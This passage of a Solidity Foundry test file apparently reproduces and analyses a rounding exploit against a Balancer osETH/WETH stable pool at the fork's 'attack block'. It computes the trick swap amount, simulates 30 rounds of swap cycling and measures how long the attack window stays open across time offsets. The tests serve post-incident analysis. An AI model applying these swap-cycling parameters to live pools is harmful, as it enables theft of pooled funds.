    ///         which is BUGGY because Foundry restores block.timestamp to the test's
    ///         post-setUp snapshot value on the 2nd+ createSelectFork in the same test
    ///         function. That accumulated setUp's 9500*12s warp into every offset >0.
    function _setupEpochOffset(uint256 extraBlocks) internal {
        vm.createSelectFork("ETH", 23717396);
        vm.warp(FORK_BLOCK_TS + extraBlocks * 12);
        swapMath = new SwapMath();

        (amp,,) = OSETH_BPT.getAmplificationParameter();
        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0);

        address[] memory rateProviders = OSETH_BPT.getRateProviders();
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        for (uint256 j = 0; j < rateProviders.length; j++) {
            if (rateProviders[j] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[j]);
            }
        }

        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
        sf = new uint256[](2);
        sf[0] = allSF[0]; // WETH
        sf[1] = allSF[2]; // osETH
    }

    /// @notice Verify the 12h StakeWise Keeper Epoch safety guarantee for remain=67000.
    ///
    /// Claims verified empirically:
    ///   [1] trickAmt = 17  for all time offsets within a 12h epoch (stable for ~61 days)
    ///   [2] upscaled_bO = floor(1 * sf[1] / 1e18) = 1  for any sf[1] in [1e18, 2e18)
    ///   [3] 0h / 6h / 12h offsets all complete 30 rounds (Swap 3 never diverges)
    ///   [4] 31.7h offset fails < 30 rounds  (confirms the failure boundary)
    ///   [5] 12h bO_in(round5) > 31.7h bO_in(round5)  (positive safety margin)
    function test_epochSafetyGuarantee() public {
        // Five checkpoints: 0h, 6h, 12h, 24h, 31.7h (in 12-second blocks)
        uint256[5] memory blockOffsets;
        blockOffsets[0] = 0;
        blockOffsets[1] = 1800;  // 6 h
        blockOffsets[2] = 3600;  // 12 h
        blockOffsets[3] = 7200;  // 24 h
        blockOffsets[4] = 9500;  // 31.7 h  (empirically-derived failure boundary)

        uint256[5] memory sf1Values;
        uint256[5] memory trickAmts;
        uint256[5] memory upscaledBOs;
        uint256[5] memory roundsCompleted;
        uint256[5] memory bOInRound5; // bO balance entering round 5 (= output of round 4)

        for (uint256 i = 0; i < 5; i++) {
            _setupEpochOffset(blockOffsets[i]);

            sf1Values[i]  = sf[1];
            uint256 delta = sf[1] - 1e18;
            trickAmts[i]  = 1e18 / delta;          // floor(1e18 / (sf[1]-1e18))
            upscaledBOs[i] = sf[1] / 1e18;         // floor(1 * sf[1] / 1e18)

            uint256 bW = 67000;
            uint256 bO = 67000;
            uint256 rounds = 0;

            for (uint256 r = 0; r < 30; r++) {
                if (r == 4) bOInRound5[i] = bO;    // snapshot before round 5

                try this.simulateOneRound(bW, bO, trickAmts[i]) returns (uint256 nW, uint256 nO) {
                    bW = nW;
                    bO = nO;
                    rounds++;
                } catch {
                    break;
                }
            }
            roundsCompleted[i] = rounds;

            uint256 hoursX10 = blockOffsets[i] * 12 * 10 / 3600; // ×10 to print one decimal
            console.log("--- Epoch offset", hoursX10 / 10, "h ---");
            console.log("  sf[1]             :", sf1Values[i]);
            console.log("  trickAmt          :", trickAmts[i]);
            console.log("  upscaled_bO       :", upscaledBOs[i]);
            console.log("  bO_in(round5)     :", bOInRound5[i]);
            console.log("  Rounds completed  :", roundsCompleted[i]);
        }

        // ── Claim 1: trickAmt is stable (= 17) through the full 12h epoch ──────
        assertEq(trickAmts[0], 17, "Claim1[0h]:  trickAmt != 17");
        assertEq(trickAmts[1], 17, "Claim1[6h]:  trickAmt != 17");
        assertEq(trickAmts[2], 17, "Claim1[12h]: trickAmt != 17");

        // ── Claim 2: upscaled_bO is always 1 regardless of sf[1] ────────────────
        assertEq(upscaledBOs[0], 1, "Claim2[0h]:  upscaled_bO != 1");
        assertEq(upscaledBOs[1], 1, "Claim2[6h]:  upscaled_bO != 1");
        assertEq(upscaledBOs[2], 1, "Claim2[12h]: upscaled_bO != 1");
        assertEq(upscaledBOs[3], 1, "Claim2[24h]: upscaled_bO != 1");
        assertEq(upscaledBOs[4], 1, "Claim2[31.7h]: upscaled_bO != 1");

        // ── Claim 3: all 30 rounds succeed within the 12h keeper epoch ───────────
        assertEq(roundsCompleted[0], 30, "Claim3[0h]:  not all 30 rounds completed");
        assertEq(roundsCompleted[1], 30, "Claim3[6h]:  not all 30 rounds completed");
        assertEq(roundsCompleted[2], 30, "Claim3[12h]: not all 30 rounds completed");

        // ── Claim 4: 31.7h crosses the failure boundary ──────────────────────────
        assertTrue(roundsCompleted[4] < 30, "Claim4[31.7h]: expected failure but all 30 rounds passed");

        // ── Claim 5: positive safety margin at the 12h boundary ─────────────────
        assertTrue(bOInRound5[2] > bOInRound5[4],
            "Claim5: 12h bO_in(round5) should be above failure-boundary value");
        console.log("Safety margin: bO_in_round5 at 12h =", bOInRound5[2],
                    ", at 31.7h (fail) =", bOInRound5[4]);
    }

    /// @notice Diagnostic 0: query the *actual* rate provider's getRate() directly,
    /// bypassing any cache. This is what `updateTokenRateCache` would write into the cache.
    function _liveProviderRate() internal view returns (uint256) {
        address[] memory providers = OSETH_BPT.getRateProviders();
        // osETH is index 2 in the pool tokens array; rateProviders is indexed the same way.
        address p = providers[2];
        require(p != address(0), "no rate provider for osETH");
        (bool ok, bytes memory data) = p.staticcall(abi.encodeWithSignature("getRate()"));
        require(ok && data.length >= 32, "getRate() failed");
        return abi.decode(data, (uint256));
    }

    /// @notice Diagnostic C: scan the rate provider's LIVE getRate() across 12h with no
    /// state mutation. Tells us whether the upstream provider is time-dependent at all.
    function test_diag_liveProviderRate_overEpoch() public {
        console.log("=== osETH rate provider .getRate() over 12h (pure view, no state changes) ===");
        vm.createSelectFork("ETH", 23717396);
        uint256 baseTs = block.timestamp;
        for (uint256 mins = 0; mins <= 720; mins += 60) {
            vm.warp(baseTs + mins * 60);
            uint256 live = _liveProviderRate();
            console.log("  +min:", mins, "providerRate:", live);
        }
    }

    /// @notice Diagnostic D: at a fixed timestamp, compare cached sf[1] vs sf[1] after
    /// calling updateTokenRateCache. Quantifies the "snapshot drift" my earlier
    /// _setupEpochOffset introduced.
    function test_diag_updateCache_effect() public {
        console.log("=== Effect of updateTokenRateCache at the fork block (no warp) ===");
        vm.createSelectFork("ETH", 23717396);
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());

        uint256[] memory before_ = OSETH_BPT.getScalingFactors();
        uint256 liveBefore = _liveProviderRate();
        console.log("BEFORE update:");
        console.log("  sf[osETH] cached :", before_[2]);
        console.log("  liveProviderRate:", liveBefore);

        OSETH_BPT.updateTokenRateCache(tokens[2]);

        uint256[] memory after_ = OSETH_BPT.getScalingFactors();
        uint256 liveAfter = _liveProviderRate();
        console.log("AFTER update:");
        console.log("  sf[osETH] cached :", after_[2]);
        console.log("  liveProviderRate:", liveAfter);
    }

    /// @notice Diagnostic E: at +6h, isolate whether updateTokenRateCache triggers
    /// state mutation in the rate provider (which would falsify the comparison
    /// across epoch offsets).
    function test_diag_providerSideEffects_at6h() public {
        vm.createSelectFork("ETH", 23717396);
        vm.warp(block.timestamp + 1800 * 12); // +6h

        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        address[] memory providers = OSETH_BPT.getRateProviders();

        console.log("=== +6h state-mutation isolation ===");
        console.log("getRateProviders length:", providers.length);
        for (uint256 i = 0; i < providers.length; i++) {
            console.log("  provider[", i, "]:", providers[i]);
        }

        uint256 liveBefore = _liveProviderRate();
        uint256[] memory sfBefore = OSETH_BPT.getScalingFactors();
        console.log("BEFORE any updateTokenRateCache:");
        console.log("  providerRate(osETH) :", liveBefore);
        console.log("  sf[osETH] cached    :", sfBefore[2]);

        // Step 1: update ONLY osETH cache (mirror real attacker minimal action)
        OSETH_BPT.updateTokenRateCache(tokens[2]);
        uint256 liveAfterOsEth = _liveProviderRate();
        uint256[] memory sfAfterOsEth = OSETH_BPT.getScalingFactors();
        console.log("AFTER updateTokenRateCache(osETH):");
        console.log("  providerRate(osETH) :", liveAfterOsEth);
        console.log("  sf[osETH] cached    :", sfAfterOsEth[2]);

        // Step 2: update ALL providers (mirror what _setupEpochOffset does)
        for (uint256 j = 0; j < providers.length; j++) {
            if (providers[j] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[j]);
            }
        }
        uint256 liveAfterAll = _liveProviderRate();
        uint256[] memory sfAfterAll = OSETH_BPT.getScalingFactors();
        console.log("AFTER updateTokenRateCache(ALL):");
        console.log("  providerRate(osETH) :", liveAfterAll);
        console.log("  sf[osETH] cached    :", sfAfterAll[2]);
    }

    /// @notice Diagnostic F: literally re-run _setupEpochOffset(1800) and inspect
    /// every value (block.timestamp, live provider rate, cached sf[osETH]) to find
    /// where the 9.5e10 discrepancy comes from.
    function test_diag_reproduceEpochOffset_6h() public {
        console.log("=== reproduce _setupEpochOffset(1800) step-by-step ===");
        vm.createSelectFork("ETH", 23717396);
        console.log("after createSelectFork: block.timestamp =", block.timestamp);
        console.log("                        block.number    =", block.number);

        vm.warp(block.timestamp + 1800 * 12);
        console.log("after warp(+21600s):  block.timestamp =", block.timestamp);

        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        address[] memory providers = OSETH_BPT.getRateProviders();

        console.log("BEFORE any updateTokenRateCache:");
        console.log("  liveProviderRate :", _liveProviderRate());
        uint256[] memory sfPre = OSETH_BPT.getScalingFactors();
        console.log("  sf[osETH] cached :", sfPre[2]);

        for (uint256 j = 0; j < providers.length; j++) {
            if (providers[j] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[j]);
            }
        }

        console.log("AFTER updateTokenRateCache loop:");
        console.log("  liveProviderRate :", _liveProviderRate());
        uint256[] memory sfPost = OSETH_BPT.getScalingFactors();
        console.log("  sf[osETH] cached :", sfPost[2]);
        console.log("  block.timestamp  :", block.timestamp);
    }

    /// @notice Diagnostic H: round-by-round replay. For a given epoch offset, run cycling
    /// and at each round print:
    ///   - bW, bO entering Swap 3
    ///   - the 3 fallback amounts attempted and which (if any) succeeded
    ///   - on full failure: the raw revert bytes from each attempt
    function _replayRounds(uint256 extraBlocks, uint256 maxRounds) internal {
        _setupEpochOffset(extraBlocks);
        uint256 trickAmt = 1e18 / (sf[1] - 1e18);
        console.log("offset_blocks:", extraBlocks);
        console.log("  sf[osETH]    :", sf[1]);
        console.log("  trickAmt     :", trickAmt);

        uint256 bW = 67000;
        uint256 bO = 67000;
        for (uint256 r = 0; r < maxRounds; r++) {
            // Replicate Swap 1 + Swap 2 to get the bW/bO entering Swap 3
            uint256[] memory cur = new uint256[](2);
            uint256[] memory scfs = new uint256[](2);
            cur[0] = bW; cur[1] = bO;
            scfs[0] = sf[0]; scfs[1] = sf[1];
            uint256[] memory mid;
            try this._previewSwap12(cur, scfs, trickAmt) returns (uint256[] memory out12) {
                mid = out12;
            } catch (bytes memory err12) {
                console.log("Round", r, "FAILED in Swap 1/2");
                console.logBytes(err12);
                return;
            }
            uint256 sw3 = _truncateToTop2Digits(mid[0]);
            console.log("--- round", r, "---");
            console.log("  bW_in_Swap3 :", mid[0]);
            console.log("  bO_in_Swap3 :", mid[1]);
            console.log("  sw3_attempt1:", sw3);

            // Try the 3 fallback steps with separate revert bytes
            try this.trySwap(mid[0], mid[1], 1, 0, sw3) returns (uint256 nW, uint256 nO) {
                console.log("    OK at attempt 1");
                bW = nW; bO = nO; continue;
            } catch (bytes memory e1) {
                console.log("    attempt 1 REVERT:");
                console.logBytes(e1);
            }
            uint256 sw3b = sw3 * 9 / 10;
            console.log("  sw3_attempt2:", sw3b);
            try this.trySwap(mid[0], mid[1], 1, 0, sw3b) returns (uint256 nW, uint256 nO) {
                console.log("    OK at attempt 2");
                bW = nW; bO = nO; continue;
            } catch (bytes memory e2) {
                console.log("    attempt 2 REVERT:");
                console.logBytes(e2);
            }
            uint256 sw3c = sw3b * 9 / 10;
            console.log("  sw3_attempt3:", sw3c);
            try this.trySwap(mid[0], mid[1], 1, 0, sw3c) returns (uint256 nW, uint256 nO) {
                console.log("    OK at attempt 3");
                bW = nW; bO = nO; continue;
            } catch (bytes memory e3) {
                console.log("    attempt 3 REVERT:");
                console.logBytes(e3);
                console.log("ALL 3 ATTEMPTS FAILED at round", r);
                return;
            }
        }
        console.log("All", maxRounds, "rounds succeeded");
    }

    /// @notice External wrapper for Swap1+Swap2 so we can try/catch them (and so they
    /// share the same external-call semantics as trySwap in _computeSwap3).
    function _previewSwap12(uint256[] memory cur, uint256[] memory scfs, uint256 trickAmt)
        external view returns (uint256[] memory)
    {
        uint256 swapOut1 = cur[1] - trickAmt - 1;
        uint256[] memory mid = swapMath.getAfterSwapOutBalances(cur, scfs, 0, 1, swapOut1, amp, swapFeePercentage);
        return swapMath.getAfterSwapOutBalances(mid, scfs, 0, 1, trickAmt, amp, swapFeePercentage);
    }

    /// @notice Compare a passing offset (+0 min) vs a failing offset (+90 min) round-by-round.
    function test_diag_diveInto_90min_vs_0min() public {
        console.log("############ +0 min (PASS) ############");
        _replayRounds(0, 8);
        console.log("");
        console.log("############ +90 min (FAIL @ round 6) ############");
        _replayRounds(450, 8); // 450 blocks * 12s = 5400s = 90 min
    }

    /// @notice Diagnostic G: reproduce the exact loop of test_epochSafetyGuarantee but
    /// print ALL state that could differ between iterations. Localizes the leakage.
    function test_diag_loopStatePollution() public {
        uint256[3] memory blockOffsets;
        blockOffsets[0] = 0;
        blockOffsets[1] = 1800; // 6h
        blockOffsets[2] = 3600; // 12h

        for (uint256 i = 0; i < 3; i++) {
            console.log("=== iteration i =", i, "blockOffset =", blockOffsets[i]);
            console.log("BEFORE _setupEpochOffset:");
            console.log("  block.timestamp :", block.timestamp);

            _setupEpochOffset(blockOffsets[i]);

            console.log("AFTER _setupEpochOffset:");
            console.log("  block.timestamp :", block.timestamp);
            console.log("  amp             :", amp);
            console.log("  liveProviderRate:", _liveProviderRate());
            console.log("  sf[osETH] cached:", sf[1]);

            // Now run a couple of cycling rounds and re-print
            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
            uint256 bW = 67000; uint256 bO = 67000;
            for (uint256 r = 0; r < 5; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO;
                } catch { break; }
            }
            console.log("AFTER 5 cycling rounds:");
            console.log("  block.timestamp :", block.timestamp);
            console.log("  liveProviderRate:", _liveProviderRate());
        }
    }

    /// @notice Diagnostic A: probe the on-chain rate cache for osETH.
    /// Reports cache (rate / duration / expires) and live rate from the rate provider.
    /// This determines whether `_setupEpochOffset` was wrong to call updateTokenRateCache
    /// at every checkpoint (i.e. whether on-chain sf[1] would actually change with timestamp).
    function test_diag_rateCacheState() public {
        vm.createSelectFork("ETH", 23717396);
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        IERC20 osETH = tokens[2];

        (uint256 rate, uint256 oldRate, uint256 duration, uint256 expires) =
            OSETH_BPT.getTokenRateCache(osETH);
        uint256 liveRate = OSETH_BPT.getTokenRate(osETH);

        console.log("=== osETH rate cache diagnostic at block 23717396 ===");
        console.log("block.timestamp        :", block.timestamp);
        console.log("cached rate            :", rate);
        console.log("cached oldRate         :", oldRate);
        console.log("cache duration (s)     :", duration);
        console.log("cache expires at       :", expires);
        if (expires > block.timestamp) {
            console.log("seconds until expiry   :", expires - block.timestamp);
            console.log("hours until expiry     :", (expires - block.timestamp) / 3600);
        } else {
            console.log("CACHE ALREADY EXPIRED at fork block (expired", block.timestamp - expires, "s ago)");
        }
        console.log("live rate (provider)   :", liveRate);
        if (liveRate != rate) {
            console.log("LIVE != CACHED, delta  :", liveRate > rate ? liveRate - rate : rate - liveRate);
        } else {
            console.log("live rate == cached rate");
        }
    }

    /// @notice Diagnostic B: scan how the *cached* sf[1] (what swaps actually use) evolves
    /// across the 12h epoch when no one calls updateTokenRateCache.
    /// If the cache expires within the epoch, anyone touching the pool refreshes it.
    function test_diag_cachedSF_overEpoch() public {
        console.log("=== Cached sf[1] over 12h, NO forced update ===");
        // Fork once and only warp; do NOT call updateTokenRateCache.
        vm.createSelectFork("ETH", 23717396);
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        IERC20 osETH = tokens[2];

        uint256 baseTs = block.timestamp;
        for (uint256 mins = 0; mins <= 720; mins += 60) {
            vm.warp(baseTs + mins * 60);
            uint256[] memory allSF = OSETH_BPT.getScalingFactors();
            (uint256 rate,, , uint256 expires) = OSETH_BPT.getTokenRateCache(osETH);
            uint256 liveRate = OSETH_BPT.getTokenRate(osETH);
            console.log("+min:", mins, "sf[osETH]:", allSF[2]);
            console.log("    cachedRate :", rate);
            console.log("    liveRate   :", liveRate);
            console.log("    expires_at :", expires, "now:", block.timestamp);
        }
    }

    /// @notice Distribution of "max continuous safe run" across multiple choices of N.
    ///
    /// We re-use a single fork at block 23717396 and treat 10 different time offsets
    /// (N_OFFSETS[i]) as 10 distinct starting points "N_i" — each with its own
    /// freshly-fetched sf[1] baseline. For each N_i:
    ///   1. Refresh rate cache so sf[1] = live osETH rate at time = FORK_TS + N_i*12
    ///   2. Verify cycling baseline (30/30) still passes; if not, mark BASELINE_FAIL
    ///   3. Scan forward block-by-block (offset b = 1..LIMIT) and find the first b
    ///      at which 30 rounds no longer all succeed
    ///   4. Record (safeRunBlocks, sf1_at_baseline)
    /// Print per-N results plus min/max/avg of the safe-run distribution.
    function test_safeRunDistribution_overMultipleN() public {
        uint256[10] memory N_OFFSETS;
        N_OFFSETS[0] = 0;
        N_OFFSETS[1] = 250;     //  +50 min
        N_OFFSETS[2] = 500;     // +100 min
        N_OFFSETS[3] = 750;     // +150 min
        N_OFFSETS[4] = 1000;    // +200 min  (~3.3h)
        N_OFFSETS[5] = 1500;    // +300 min  (~5.0h)
        N_OFFSETS[6] = 2000;    // +400 min  (~6.7h)
        N_OFFSETS[7] = 2500;    // +500 min  (~8.3h)
        N_OFFSETS[8] = 3000;    // +600 min  (~10h)
        N_OFFSETS[9] = 3500;    // +700 min  (~11.7h, near end of 12h epoch)

        uint256 LIMIT  = 400;   // scan up to 400 blocks past each N (~80 min)
        uint256 ROUNDS = 30;
        uint256 REMAIN = 67000;

        // single fork
        _setupEpochOffset(0);

        uint256[10] memory safeRunBlocks; // 0 means BASELINE_FAIL
        uint256[10] memory sf1Baseline;
        uint256[10] memory firstFailRoundsDone;

        for (uint256 i = 0; i < 10; i++) {
            uint256 N = N_OFFSETS[i];

            // baseline at N
            _warpAndRefreshSf(N);
            sf1Baseline[i] = sf[1];
            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
            uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 ok0 = 0;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO; ok0++;
                } catch { break; }
            }
            if (ok0 < ROUNDS) {
                safeRunBlocks[i] = 0; // sentinel: baseline does NOT pass
                firstFailRoundsDone[i] = ok0;
                console.log("N_offset:", N, "BASELINE FAILS, rounds:", ok0);
                continue;
            }

            // scan forward
            uint256 firstFail = LIMIT + 1; // sentinel for "no fail within LIMIT"
            uint256 ffRounds = 0;
            for (uint256 b = 1; b <= LIMIT; b++) {
                _warpAndRefreshSf(N + b);
                trickAmt = 1e18 / (sf[1] - 1e18);
                bW = REMAIN; bO = REMAIN; uint256 ok = 0;
                for (uint256 r = 0; r < ROUNDS; r++) {
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                        bW = nW; bO = nO; ok++;
                    } catch { break; }
                }
                if (ok < ROUNDS) {
                    firstFail = b;
                    ffRounds = ok;
                    break;
                }
            }
            safeRunBlocks[i] = firstFail - 1; // last safe offset
            firstFailRoundsDone[i] = ffRounds;
            console.log("N_offset:", N, "safeRun(blocks):", safeRunBlocks[i]);
        }

        // ─── distribution summary ──────────────────────────────────────────
        console.log("");
        console.log("=== Per-N detail ===");
        for (uint256 i = 0; i < 10; i++) {
            console.log("N_offset (blocks):", N_OFFSETS[i]);
            console.log("  baseline sf[1] :", sf1Baseline[i]);
            if (safeRunBlocks[i] == 0 && firstFailRoundsDone[i] < ROUNDS) {
                console.log("  BASELINE_FAIL, rounds:", firstFailRoundsDone[i]);
            } else if (safeRunBlocks[i] >= LIMIT) {
                console.log("  safeRun (blocks): >=", LIMIT, "(no fail within LIMIT)");
            } else {
                console.log("  safeRun (blocks):", safeRunBlocks[i]);
                console.log("  safeRun (sec)   :", safeRunBlocks[i] * 12);
                console.log("  safeRun (min)   :", safeRunBlocks[i] * 12 / 60);
                console.log("  first-fail rounds:", firstFailRoundsDone[i]);
            }
        }

        // min/max/avg over the N's where baseline passed
        uint256 minRun = type(uint256).max;
        uint256 maxRun = 0;
        uint256 sumRun = 0;
        uint256 cnt = 0;
        for (uint256 i = 0; i < 10; i++) {
            if (safeRunBlocks[i] == 0 && firstFailRoundsDone[i] < ROUNDS) continue; // skip BASELINE_FAIL
            uint256 v = safeRunBlocks[i];
            if (v < minRun) minRun = v;
            if (v > maxRun) maxRun = v;
            sumRun += v;
            cnt++;
        }
        console.log("");
        console.log("=== Summary (across", cnt, "passing baselines) ===");
        if (cnt > 0) {
            console.log("min safeRun (blocks):", minRun, "= min(min):", minRun * 12 / 60);
            console.log("max safeRun (blocks):", maxRun, "= min(max):", maxRun * 12 / 60);
            console.log("avg safeRun (blocks):", sumRun / cnt, "= min(avg):", (sumRun / cnt) * 12 / 60);
        }
    }

    /// @notice Light-weight per-offset setup that REUSES the existing fork (set up once
    /// in the caller). Avoids the per-iteration `vm.createSelectFork` overhead which
    /// otherwise blows the EVM gas budget for long scans.
    /// Updates: block.timestamp, all rate caches, contract-level amp/sf/swapFee.
    function _warpAndRefreshSf(uint256 extraBlocks) internal {
        vm.warp(FORK_BLOCK_TS + extraBlocks * 12);

        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        address[] memory providers = OSETH_BPT.getRateProviders();
        for (uint256 j = 0; j < providers.length; j++) {
            if (providers[j] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[j]);
            }
        }
        (amp,,) = OSETH_BPT.getAmplificationParameter();
        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0);

        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
        sf = new uint256[](2);
        sf[0] = allSF[0];
        sf[1] = allSF[2];
    }

    /// @notice Refresh contract-level state after a fresh `vm.createSelectFork`.
    /// Updates rate caches and re-reads amp/sf/swapFee at the current fork's block
    /// without warping time.
    function _refreshAtCurrentFork() internal {
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        address[] memory providers = OSETH_BPT.getRateProviders();
        for (uint256 j = 0; j < providers.length; j++) {
            if (providers[j] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[j]);
            }
        }
        (amp,,) = OSETH_BPT.getAmplificationParameter();
        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0);
        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
        sf = new uint256[](2);
        sf[0] = allSF[0];
        sf[1] = allSF[2];
    }

    /// @notice Warp `block.timestamp` to an absolute value and refresh sf[1] only.
    /// Used inside the per-N scan inner loop where pool balances/amp/swapFee
    /// are assumed unchanged within the small (~LIMIT) scan window.
    function _warpToTsAndRefreshSf(uint256 absTs) internal {
        vm.warp(absTs);
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        address[] memory providers = OSETH_BPT.getRateProviders();
        for (uint256 j = 0; j < providers.length; j++) {
            if (providers[j] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[j]);
            }
        }
        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
        sf[1] = allSF[2];
    }

    /// @notice External wrapper so try/catch can intercept reverts from the rate
    /// provider when warping past its lastUpdate timestamp (esp. on backward scans).
    function tryWarpToTsAndRefreshSf(uint256 absTs) external {
        _warpToTsAndRefreshSf(absTs);
    }

    /// @notice Real-fork safe-run distribution.
    /// For each starting block N_i:
    ///   1. `vm.createSelectFork("ETH", N_i)` -- real pool state at that block
    ///   2. Refresh amp/sf/swapFee/rate-cache
    ///   3. Run baseline cycling (30 rounds) with off-chain-tuned remain_i
    ///   4. If baseline passes, scan forward via vm.warp + updateTokenRateCache only
    ///      (pool balances unchanged inside the small forward window) and find the
    ///      first `b` at which 30 rounds no longer all succeed
    ///   5. Record safeRun_i = b-1
    /// Reports per-N detail and min/max/avg over passing baselines.
    function test_realForkSafeRunDistribution() public {
        uint256[11] memory blockNums;
        blockNums[0]  = 23717396;  // attack block (original baseline)
        blockNums[1]  = 23717196;  // -200    (-40 min)
        blockNums[2]  = 23715196;  // -2200   (-7.3h)
        blockNums[3]  = 23710196;  // -7200   (-1 day)
        blockNums[4]  = 23703000;  // -14400  (-2 days)
        blockNums[5]  = 23695800;  // -21600  (-3 days)
        blockNums[6]  = 23681400;  // -36000  (-5 days)
        blockNums[7]  = 23667000;  // -50400  (-1 week)
        blockNums[8]  = 23616600;  // -100800 (-2 weeks)
        blockNums[9]  = 23566200;  // -151200 (-3 weeks)
        blockNums[10] = 23501400;  // -216000 (-1 month)

        uint256[11] memory remains;
        remains[0]  = 67000;
        remains[1]  = 67000;
        remains[2]  = 53000;
        remains[3]  = 67000;
        remains[4]  = 66000;
        remains[5]  = 70000;
        remains[6]  = 60000;
        remains[7]  = 60000;
        remains[8]  = 63000;
        remains[9]  = 78000;
        remains[10] = 77000;

        uint256 LIMIT  = 400;  // per-direction scan length (12s each => 80 min)
        uint256 ROUNDS = 30;

        uint256[11] memory fwdSafe;
        uint256[11] memory bwdSafe;
        uint256[11] memory fwdFailRounds;
        uint256[11] memory bwdFailRounds;
        uint256[11] memory baseSf1;
        uint256[11] memory baseTimestamps;
        bool[11]    memory baselinePassed;

        for (uint256 i = 0; i < 11; i++) {
            // 1. Real fork at this block
            vm.createSelectFork("ETH", blockNums[i]);
            swapMath = new SwapMath();
            _refreshAtCurrentFork();
            uint256 baseTs = block.timestamp;
            baseTimestamps[i] = baseTs;
            baseSf1[i] = sf[1];
            uint256 trickAmt = 1e18 / (sf[1] - 1e18);

            // 2. Baseline (offset 0)
            uint256 bW = remains[i]; uint256 bO = remains[i]; uint256 ok0 = 0;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO; ok0++;
                } catch { break; }
            }
            if (ok0 < ROUNDS) {
                baselinePassed[i] = false;
                console.log("BASELINE_FAIL block:", blockNums[i], "rounds:", ok0);
                continue;
            }
            baselinePassed[i] = true;

            // 3. Forward scan: baseTs + b*12
            uint256 firstFail = LIMIT + 1;
            uint256 ffRounds  = 0;
            for (uint256 b = 1; b <= LIMIT; b++) {
                try this.tryWarpToTsAndRefreshSf(baseTs + b * 12) {
                    // ok
                } catch { firstFail = b; ffRounds = 0; break; }
                trickAmt = 1e18 / (sf[1] - 1e18);
                bW = remains[i]; bO = remains[i]; uint256 ok = 0;
                for (uint256 r = 0; r < ROUNDS; r++) {
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                        bW = nW; bO = nO; ok++;
                    } catch { break; }
                }
                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
            }
            fwdSafe[i] = firstFail - 1;
            fwdFailRounds[i] = ffRounds;

            // 4. Backward scan: baseTs - b*12
            firstFail = LIMIT + 1;
            ffRounds  = 0;
            for (uint256 b = 1; b <= LIMIT; b++) {
                try this.tryWarpToTsAndRefreshSf(baseTs - b * 12) {
                    // ok
                } catch { firstFail = b; ffRounds = 0; break; }
                trickAmt = 1e18 / (sf[1] - 1e18);
                bW = remains[i]; bO = remains[i]; uint256 ok = 0;
                for (uint256 r = 0; r < ROUNDS; r++) {
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                        bW = nW; bO = nO; ok++;
                    } catch { break; }
                }
                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
            }
            bwdSafe[i] = firstFail - 1;
            bwdFailRounds[i] = ffRounds;

            console.log("block:", blockNums[i], "remain:", remains[i]);
            console.log("  fwdSafe:", fwdSafe[i], "bwdSafe:", bwdSafe[i]);
        }

        _printRealForkSummary(blockNums, remains, fwdSafe, bwdSafe,
                               fwdFailRounds, bwdFailRounds,
                               baseSf1, baseTimestamps, baselinePassed, LIMIT);
    }

    /// @notice Diagnostic: for each of the 11 sample blocks used in
    /// `test_realForkSafeRunDistribution`, fork at N-400, N, N+400 and read
    /// `(amp, isUpdating, precision)` and `swapFeePercentage`. Confirms that
    /// the values frozen at N (which the per-N scan loop reuses across the
    /// ±400-block warp window) are equal to the on-chain values at the scan
    /// boundaries — i.e. neither amp ramping nor a governance fee change
    /// occurred inside the scan window.
    function test_diag_ampAndFeeStability() public {
        uint256[11] memory blockNums;
        blockNums[0]  = 23717396;
        blockNums[1]  = 23717196;
        blockNums[2]  = 23715196;
        blockNums[3]  = 23710196;
        blockNums[4]  = 23703000;
        blockNums[5]  = 23695800;
        blockNums[6]  = 23681400;
        blockNums[7]  = 23667000;
        blockNums[8]  = 23616600;
        blockNums[9]  = 23566200;
        blockNums[10] = 23501400;

        uint256 SCAN = 400;
        uint256 driftCount = 0;
